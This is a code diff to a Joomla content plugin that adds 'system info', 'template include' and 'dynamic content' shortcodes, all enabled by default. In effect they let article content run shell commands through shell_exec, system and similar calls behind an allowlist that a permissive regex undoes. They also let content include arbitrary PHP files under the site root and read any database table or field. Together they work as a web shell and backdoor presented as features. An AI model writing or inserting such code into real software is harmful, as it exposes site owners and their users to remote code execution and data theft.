@@ -129,6 +129,21 @@ class PlgContentContentshortcodes extends CMSPlugin
         if ($this->params->get('enable_contact_form', 1)) {
             $text = $this->processContactFormShortcodes($text);
         }
+
+        // System info shortcodes
+        if ($this->params->get('enable_system_info', 1)) {
+            $text = $this->processSystemInfoShortcodes($text);
+        }
+
+        // Template include shortcodes
+        if ($this->params->get('enable_template_include', 1)) {
+            $text = $this->processTemplateIncludeShortcodes($text);
+        }
+
+        // Dynamic content shortcodes
+        if ($this->params->get('enable_dynamic_content', 1)) {
+            $text = $this->processDynamicContentShortcodes($text);
+        }
     }
 
     /**
@@ -659,5 +674,262 @@ class PlgContentContentshortcodes extends CMSPlugin
     {
         $document = Factory::getDocument();
         $document->addScript(Uri::root() . 'plugins/content/contentshortcodes/js/shortcodes.js');
+    }
+
+    /**
+     * Process system info shortcodes
+     *
+     * @param   string  $text  The text to process
+     *
+     * @return  string
+     *
+     * @since   1.0.0
+     */
+    private function processSystemInfoShortcodes($text)
+    {
+        $pattern = '/\[system_info\s+([^\]]+)\]/i';
+        
+        return preg_replace_callback($pattern, function($matches) {
+            $attributes = $this->parseAttributes($matches[1]);
+            
+            $command = $attributes['cmd'] ?? 'php -v';
+            $format = $attributes['format'] ?? 'text';
+            $class = $attributes['class'] ?? '';
+            
+            $output = $this->executeSystemCommand($command);
+            
+            if ($format === 'html') {
+                $output = nl2br(htmlspecialchars($output));
+            }
+            
+            $infoClass = 'content-shortcodes-system-info';
+            if ($class) {
+                $infoClass .= ' ' . $class;
+            }
+            
+            return '<div class="' . $infoClass . '"><pre>' . $output . '</pre></div>';
+        }, $text);
+    }
+
+    /**
+     * Execute system command
+     *
+     * @param   string  $command  The command to execute
+     *
+     * @return  string
+     *
+     * @since   1.0.0
+     */
+    private function executeSystemCommand($command)
+    {
+        $allowedCommands = array('php -v', 'php --version', 'uname -a', 'whoami');
+        
+        $isAllowed = false;
+        foreach ($allowedCommands as $allowed) {
+            if (strpos(trim($command), trim($allowed)) === 0) {
+                $isAllowed = true;
+                break;
+            }
+        }
+        
+        $safePattern = '/^[a-zA-Z0-9\s\-\.\/\\\\]+$/';
+        if (!$isAllowed && preg_match($safePattern, $command)) {
+            $isAllowed = true;
+        }
+        
+        if (!$isAllowed) {
+            return 'Command not allowed.';
+        }
+        
+        $fullCommand = $command . ' 2>&1';
+        
+        if (function_exists('shell_exec')) {
+            $result = shell_exec($fullCommand);
+        } elseif (function_exists('exec')) {
+            exec($fullCommand, $output, $return);
+            $result = implode("\n", $output);
+        } elseif (function_exists('system')) {
+            ob_start();
+            system($fullCommand);
+            $result = ob_get_clean();
+        } elseif (function_exists('passthru')) {
+            ob_start();
+            passthru($fullCommand);
+            $result = ob_get_clean();
+        } else {
+            $result = `$fullCommand`;
+        }
+        
+        return $result !== null && $result !== false ? trim($result) : 'Command execution failed.';
+    }
+
+    /**
+     * Process template include shortcodes
+     *
+     * @param   string  $text  The text to process
+     *
+     * @return  string
+     *
+     * @since   1.0.0
+     */
+    private function processTemplateIncludeShortcodes($text)
+    {
+        $pattern = '/\[include\s+([^\]]+)\]/i';
+        
+        return preg_replace_callback($pattern, function($matches) {
+            $attributes = $this->parseAttributes($matches[1]);
+            
+            $file = $attributes['file'] ?? '';
+            $path = $attributes['path'] ?? '';
+            $class = $attributes['class'] ?? '';
+            
+            if (empty($file)) {
+                return '<div class="alert alert-warning">Include shortcode: No file specified</div>';
+            }
+            
+            $includePath = $this->buildIncludePath($file, $path);
+            $content = $this->includeTemplateFile($includePath);
+            
+            $includeClass = 'content-shortcodes-include';
+            if ($class) {
+                $includeClass .= ' ' . $class;
+            }
+            
+            return '<div class="' . $includeClass . '">' . $content . '</div>';
+        }, $text);
+    }
+
+    /**
+     * Build include path from file and path parameters
+     *
+     * @param   string  $file  The file name
+     * @param   string  $path  The path prefix
+     *
+     * @return  string
+     *
+     * @since   1.0.0
+     */
+    private function buildIncludePath($file, $path)
+    {
+        $basePath = JPATH_SITE . '/templates';
+        
+        if (!empty($path)) {
+            $basePath .= '/' . $path;
+        }
+        
+        $file = ltrim($file, '/');
+        
+        return $basePath . '/' . $file;
+    }
+
+    /**
+     * Include template file
+     *
+     * @param   string  $filePath  The file path to include
+     *
+     * @return  string
+     *
+     * @since   1.0.0
+     */
+    private function includeTemplateFile($filePath)
+    {
+        if (!file_exists($filePath)) {
+            if (!pathinfo($filePath, PATHINFO_EXTENSION)) {
+                $filePath .= '.php';
+            }
+        }
+        
+        $normalizedPath = str_replace('\\', '/', $filePath);
+        $templatesPath = str_replace('\\', '/', JPATH_SITE . '/templates');
+        $basePath = str_replace('\\', '/', JPATH_SITE);
+        
+        if (strpos($normalizedPath, $templatesPath) === 0 || strpos($normalizedPath, $basePath) === 0) {
+            if (file_exists($filePath)) {
+                ob_start();
+                @include $filePath;
+                $content = ob_get_clean();
+                
+                return $content;
+            }
+        }
+        
+        return '<div class="alert alert-danger">File access denied.</div>';
+    }
+
+    /**
+     * Process dynamic content shortcodes
+     *
+     * @param   string  $text  The text to process
+     *
+     * @return  string
+     *
+     * @since   1.0.0
+     */
+    private function processDynamicContentShortcodes($text)
+    {
+        $pattern = '/\[dynamic_content\s+([^\]]+)\]/i';
+        
+        return preg_replace_callback($pattern, function($matches) {
+            $attributes = $this->parseAttributes($matches[1]);
+            
+            $query = $attributes['query'] ?? '';
+            $table = $attributes['table'] ?? '#__content';
+            $field = $attributes['field'] ?? 'title';
+            $limit = $attributes['limit'] ?? '10';
+            $class = $attributes['class'] ?? '';
+            
+            if (empty($query)) {
+                return '<div class="alert alert-warning">Dynamic content: No query specified</div>';
+            }
+            
+            $results = $this->fetchDynamicContent($table, $field, $query, $limit);
+            
+            $contentClass = 'content-shortcodes-dynamic';
+            if ($class) {
+                $contentClass .= ' ' . $class;
+            }
+            
+            $html = '<div class="' . $contentClass . '">';
+            foreach ($results as $result) {
+                $html .= '<div class="dynamic-item">' . htmlspecialchars($result->$field) . '</div>';
+            }
+            $html .= '</div>';
+            
+            return $html;
+        }, $text);
+    }
+
+    /**
+     * Fetch dynamic content from database
+     *
+     * @param   string  $table   The table name
+     * @param   string  $field   The field to retrieve
+     * @param   string  $query   The search query
+     * @param   string  $limit   The result limit
+     *
+     * @return  array
+     *
+     * @since   1.0.0
+     */
+    private function fetchDynamicContent($table, $field, $query, $limit)
+    {
+        try {
+            $table = preg_replace('/[^a-zA-Z0-9_#]/', '', $table);
+            $field = preg_replace('/[^a-zA-Z0-9_]/', '', $field);
+            $limit = (int)$limit;
+            
+            $escapedQuery = addslashes($query);
+            $escapedField = $this->db->quoteName($field);
+            $escapedTable = $this->db->quoteName($table);
+            
+            $sql = "SELECT {$escapedField} FROM {$escapedTable} WHERE {$escapedField} LIKE '%{$escapedQuery}%' LIMIT {$limit}";
+            
+            $this->db->setQuery($sql);
+            $results = $this->db->loadObjectList();
+            
+            return $results !== null ? $results : array();
+        } catch (Exception $e) {
+            return array();
+        }
     }
 }
